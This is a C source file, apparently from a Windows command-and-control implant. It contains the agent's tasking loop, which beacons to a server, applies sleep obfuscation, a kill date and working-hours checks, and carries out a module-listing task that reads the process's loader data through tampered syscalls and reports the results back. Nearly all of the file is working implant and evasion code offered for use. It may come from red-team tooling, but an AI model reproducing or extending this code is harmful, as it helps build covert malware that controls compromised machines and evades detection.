#include "../../headers/taskcontroller/TaskController.h"
#include "../../headers/agent/evasion/Common.h"
#include "../../headers/package/package.h"
#include "../../headers/cstdreplacement/localcstd.h"


void TaskingRoutine() {

    PARSER   Parser = { 0 };
    DataBuffer   Buffer = { 0 };
    SIZE_T   DataBufferSize = { 0 };
    PARSER   TaskParser = { 0 };
    LPVOID   TaskBuffer = { 0 };
    UINT32   TaskBufferSize = { 0 };
    UINT32   CommandID = { 0 };
    UINT32   RequestID = { 0 };
	AgentCMD AgentCMD = { 0 };
	pPackage pPackage = NULL;

    while (TRUE) {
        if (!agent->session->Active)
            break;
        
        PerformSleepObf();

        if (ReachedKillDate()) {
            printf("[info] Kill date reached, exiting agent.\n");
            exit(-1);
        }

        if (!InWorkingHours())
        {
            continue;
        }

        //TODO perform package sending request. that will send all open packages and receive any responses from the server for commands to execute.
        if (!PackageSendAll(&Buffer, &DataBufferSize))
        {
            break;
        }
    	pPackage = CreatePackage(SEND_DATA);
        
		if (Buffer.Buffer && Buffer.BufferLength > 0) { // if we successfully sent our queued packages and received a response.

            NewParser(&Parser, Buffer.Buffer, Buffer.BufferLength);
            AgentCMD.CommandID = ParserReadInt32(&Parser);
            AgentCMD.RequestID = ParserReadInt32(&Parser);

		    switch (AgentCMD.CommandID) {
                case NO_JOB:
                    printf("[info] no job to do.\n");
                    break;

                case REGISTER_AGENT:
                    PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL);
                    break;

		        case LIST_LOADED_MODULES:
					NTSTATUS NtStatus = 0x00;
		    		PROCESS_BASIC_INFORMATION PBI = {0};
		    		OBJECT_ATTRIBUTES ObjAttr = {0};
		    		HANDLE hProc = NULL;
		    		CLIENT_ID ClientID = {0};
		    		ClientID.UniqueProcess = agent->Context->PID;
		    		ClientID.UniqueThread = agent->Context->TID;

		    		InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);

		    	printf("[info] in loaded modules\n");

					if ((NtStatus =  TAMPER_SYSCALL(agent->apis->pNtOpenProcess, 4, &hProc, PROCESS_ALL_ACCESS, &ObjAttr, &ClientID)) != 0x00) {
						printf("[error] attempting to call NtOpenProcess %llx\n", NtStatus);
						break;
					}
		    		if ((NtStatus = TAMPER_SYSCALL(agent->apis->pNtQueryInformationProcess, 5, hProc, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), NULL)) != 0x00) {
						printf("[error] attempting to call NtQueryInformationProcess %llx\n", NtStatus);
		    			break;
		    		}

		    	PPEB_LDR_DATA LoaderData = NULL;
		    	PLIST_ENTRY ListHead, ListEntry = NULL;
		    	SIZE_T size = 0;
		    	LDR_DATA_TABLE_ENTRY CurrentModule = {0};
		    	WCHAR ModuleNameW[MAX_PATH] = {0};
		    	CHAR ModuleNameA[MAX_PATH] = {0};

					AddInt32ToPackage(pPackage, agent->Context->PID);

		    	if((NtStatus = TAMPER_SYSCALL(agent->apis->pNtReadVirtualMemory, 5, hProc, &PBI.PebBaseAddress->Ldr, &LoaderData, sizeof(PPEB_LDR_DATA), NULL)) == 0x00) {
					ListHead = &LoaderData->InMemoryOrderModuleList;
		    		size = 0;
		    		if((NtStatus = TAMPER_SYSCALL(agent->apis->pNtReadVirtualMemory, 5, hProc, &ListHead->Flink, &ListEntry, sizeof(PLIST_ENTRY), NULL)) == 0x00) {
		    			while(ListEntry != ListHead) {
		    				if((NtStatus = TAMPER_SYSCALL(agent->apis->pNtReadVirtualMemory, 5, hProc, CONTAINING_RECORD(ListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &CurrentModule, sizeof(LDR_DATA_TABLE_ENTRY), NULL)) != 0x00) {
		    					break;
		    				}
		    				if((NtStatus = TAMPER_SYSCALL(agent->apis->pNtReadVirtualMemory, 5, hProc, CurrentModule.FullDllName.Buffer, &ModuleNameW, CurrentModule.FullDllName.Length, &size)) != 0x00) {
		    					break;
		    				}
		    				if (CurrentModule.FullDllName.Length > 0) {
		    					//printf("%ws\n", ModuleNameW);
		    					size = WCharToChar(ModuleNameA, ModuleNameW, CurrentModule.FullDllName.Length);

		    					AddStringToPackage(pPackage, ModuleNameA);
		    					AddPtrToPackage(pPackage, CurrentModule.DllBase);
		    				}

							MemorySet(ModuleNameW, 0, MAX_PATH);
		    				MemorySet(ModuleNameA, 0, MAX_PATH);

		    				ListEntry = CurrentModule.InMemoryOrderLinks.Flink;
		    			}
		    		}
		    	}

		    		if(hProc)
		    			NtStatus = TAMPER_SYSCALL(agent->apis->pNtClose, 1, hProc);
		    		if (NtStatus != 0x00) {
		    			agent->apis->pNtClose(hProc);
		    		}
					break;

                default:
                    break;
            }
        }
        else // we did not rececive a response from the server server is down or we have no connectivity.
        { 
			break;
        }
    	if(pPackage->Length > 0) {
    		printf("[info] adding package to package list\n");
    		AddPackageToAgentPackageList(pPackage);
    	}
    }

    agent->session->Active = FALSE;

}


BOOL ReachedKillDate() {
	UINT64 CurrentTime = 0;
    CurrentTime = GetUnixTime();
    if (CurrentTime >= agent->config->KillDate) {
        return TRUE;
    }
	return FALSE;
}

BOOL InWorkingHours() {
	SYSTEMTIME SystemTime = { 0 };
	UINT32 WorkingHours = agent->config->WorkingHours;
    WORD StartHour = 0;
    WORD StartMinute = 0;
    WORD EndHour = 0;
    WORD EndMinute = 0;

	//if working hours not set return true as we're always in working hours.
    if (((WorkingHours >> 22) & 1) == 0)
        return TRUE;

    StartHour = (WorkingHours >> 17) & 0b011111;
    StartMinute = (WorkingHours >> 11) & 0b111111;
    EndHour = (WorkingHours >> 6) & 0b011111;
    EndMinute = (WorkingHours >> 0) & 0b111111;

	agent->apis->pGetLocalTime(&SystemTime);

	if (SystemTime.wHour < StartHour || SystemTime.wHour > EndHour)
		return FALSE;
	if (SystemTime.wHour == StartHour && SystemTime.wMinute < StartMinute)
		return FALSE;
	if (SystemTime.wHour == EndHour && SystemTime.wMinute > EndMinute)
		return FALSE;

	return TRUE;
}